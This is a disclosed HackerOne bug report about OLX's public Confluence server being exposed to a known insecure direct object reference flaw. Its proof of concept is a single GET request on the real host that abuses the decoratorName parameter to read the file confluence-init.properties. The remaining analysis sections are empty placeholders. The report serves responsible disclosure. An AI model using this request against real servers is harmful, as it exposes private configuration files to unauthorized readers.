---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '207013'
original_report_id: '207013'
title: Public Vulnerable Version of Confluence https://confluence.olx.com
weakness: Information Disclosure
team_handle: olx
created_at: '2017-02-17T00:23:07.145Z'
disclosed_at: '2019-06-03T19:07:20.698Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 31
tags:
- hackerone
- information-disclosure
---

# Public Vulnerable Version of Confluence https://confluence.olx.com

## Metadata

- HackerOne Report ID: 207013
- Weakness: Information Disclosure
- Program: olx
- Disclosed At: 2019-06-03T19:07:20.698Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

The public server is vulnerable to Insecure Direct Object Reference, allowing any authenticated user to read configuration files from the application such as the content of webapp directory in confluence.

Link to the public issue: https://jira.atlassian.com/browse/CONF-39704

PoC:

GET:

https://confluence.olx.com/spaces/viewdefaultdecorator.action?decoratorName=/WEB-INF/classes/confluence-init.properties

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
